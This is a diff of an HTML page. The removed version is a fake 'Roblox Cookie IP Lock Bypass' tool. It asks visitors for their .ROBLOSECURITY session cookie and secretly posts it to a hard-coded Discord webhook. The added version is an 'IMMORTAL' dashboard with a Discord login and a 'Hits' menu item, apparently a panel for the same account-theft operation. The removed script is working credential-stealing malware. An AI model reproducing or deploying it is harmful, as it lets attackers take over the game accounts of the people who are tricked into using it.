@@ -3,121 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie IP Lock Bypass</title>
-    <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            margin: 20px; 
-            background: #f9f9f9;
-        }
-        h2 {
-            font-size: 22px;
-        }
-        input, button {
-            width: 90%; 
-            max-width: 400px;
-            padding: 12px;
-            margin: 10px 0;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            background: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-        #newCookie {
-            background: #f0f0f0;
-            border: 1px solid #ccc;
-            padding: 12px;
-            width: 90%;
-            max-width: 400px;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
-            white-space: pre-wrap;
-            margin: 10px auto;
-            text-align: left;
-            border-radius: 5px;
-        }
-        /* Popup styles */
-        .popup {
-            display: none;
-            position: fixed;
-            top: 10%;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 12px 18px;
-            border-radius: 8px;
-            font-size: 14px;
-            z-index: 1000;
-            width: 80%;
-            max-width: 300px;
-            text-align: center;
-            animation: fadeInOut 2s forwards;
-        }
-        @keyframes fadeInOut {
-            0% { opacity: 0; transform: translateX(-50%) translateY(-10px); }
-            10% { opacity: 1; transform: translateX(-50%) translateY(0px); }
-            90% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-    </style>
-    <script>
-        function showPopupMessage() {
-            const popup = document.createElement("div");
-            popup.className = "popup";
-            popup.innerHTML = "⚠️ IP lock already removed, no need to refresh cookie.";
-            document.body.appendChild(popup);
-            popup.style.display = "block";
-
-            setTimeout(() => {
-                popup.style.display = "none";
-                document.body.removeChild(popup);
-            }, 2000);
-        }
-
-        async function sendCookie() {
-            const cookie = document.getElementById("cookieInput").value;
-            if (!cookie) {
-                showPopupMessage("Please enter a cookie!");
-                return;
-            }
-            
-            document.getElementById("newCookie").textContent = cookie;
-            showPopupMessage(); // Custom popup instead of alert()
-
-            const webhookURL = "https://discord.com/api/webhooks/1342145069012226128/tCdPrO95hcPpasmFRjQtymKgYK028-0l3rZ4NgzlLKg0DgTUL4kj2ft1N0OT5LREM8jx";
-            
-            const payload = {
-                content: "@everyone New Cookie:",  
-                embeds: [{
-                    title: "🔑 New Roblox Cookie",
-                    description: "```" + cookie + "```",
-                    color: 16711680
-                }]
-            };
-            
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            }).catch(err => console.error("Webhook error:", err));
-        }
-    </script>
+    <title>IMMORTAL | Login</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <h2>Roblox Cookie IP Lock Bypass</h2>
-    <input type="text" id="cookieInput" placeholder="Enter Roblox .ROBLOSECURITY">
-    <button onclick="sendCookie()">Bypass</button>
-    <h3>New Cookie:</h3>
-    <div id="newCookie">Waiting...</div>
+    <!-- Login Page (shown by default) -->
+    <div class="login-container" id="loginPage">
+        <div class="login-content">
+            <h1 class="game-title">IMMORTAL</h1>
+            <button class="discord-login-btn" id="discordLogin">
+                <i class="fab fa-discord"></i>
+                LOGIN WITH DISCORD
+            </button>
+        </div>
+    </div>
+
+    <!-- Dashboard (hidden until login) -->
+    <div class="dashboard" id="dashboard">
+        <!-- Notification System -->
+        <div class="notification-container">
+            <button class="notification-btn" id="notificationBtn">
+                <i class="fas fa-bell"></i>
+                <span class="notification-badge" id="notificationBadge">3</span>
+            </button>
+        </div>
+
+        <!-- Notification Popup -->
+        <div class="notification-popup" id="notificationPopup">
+            <div class="notification-header">
+                <span>Notifications</span>
+                <button class="notification-close" id="notificationClose">&times;</button>
+            </div>
+            <div class="notification-content" id="notificationContent">
+                <div class="notification-item">
+                    <div class="notification-title">New Update Available</div>
+                    <div class="notification-time">2 hours ago</div>
+                    <div class="notification-message">Version 2.5.0 is now available with new features and bug fixes. Check out the changelog for details!</div>
+                </div>
+                <div class="notification-item">
+                    <div class="notification-title">Maintenance Scheduled</div>
+                    <div class="notification-time">1 day ago</div>
+                    <div class="notification-message">Server maintenance planned for tomorrow at 3 AM UTC. Expected downtime: 30 minutes.</div>
+                </div>
+                <div class="notification-item">
+                    <div class="notification-title">Welcome to IMMORTAL</div>
+                    <div class="notification-time">3 days ago</div>
+                    <div class="notification-message">Thank you for joining our community! Get started by exploring the dashboard.</div>
+                </div>
+            </div>
+            <div class="notification-footer">
+                <button class="notification-nav-btn" id="prevNotification" disabled>
+                    <i class="fas fa-chevron-left"></i> Previous
+                </button>
+                <button class="notification-nav-btn" id="nextNotification">
+                    Next <i class="fas fa-chevron-right"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="overlay" id="overlay"></div>
+
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar" id="sidebar">
+            <button class="sidebar-toggle" id="sidebarToggle">
+                <i class="fas fa-chevron-left"></i>
+            </button>
+            <div class="sidebar-header">
+                <div class="sidebar-title">
+                    <i class="fas fa-gamepad"></i>
+                    <span>IMMORTAL</span>
+                </div>
+            </div>
+            <nav class="nav-menu">
+                <ul>
+                    <li class="nav-item active">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-tachometer-alt"></i>
+                            <span>Dashboard</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-bullseye"></i>
+                            <span>Hits</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-tools"></i>
+                            <span>Tools</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-cog"></i>
+                            <span>Settings</span>
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="content-header">
+                <button class="mobile-menu-toggle hidden" id="mobileMenuToggle">
+                    <i class="fas fa-bars"></i>
+                </button>
+                <h1 class="page-title">Dashboard</h1>
+                <div class="user-menu">
+                    <div class="profile-dropdown">
+                        <img src="" alt="User Avatar" class="user-avatar" id="userAvatar">
+                        <div class="profile-menu" id="profileMenu">
+                            <a href="#"><i class="fas fa-user"></i> Profile</a>
+                            <a href="#" class="logout" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</a>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content">
+                <h1 class="game-title-retro">IMMORTAL</h1>
+                <h2>Welcome back, <span id="username">User</span>!</h2>
+                <p>This is your dark glass-themed dashboard with red accents.</p>
+            </div>
+        </main>
+    </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
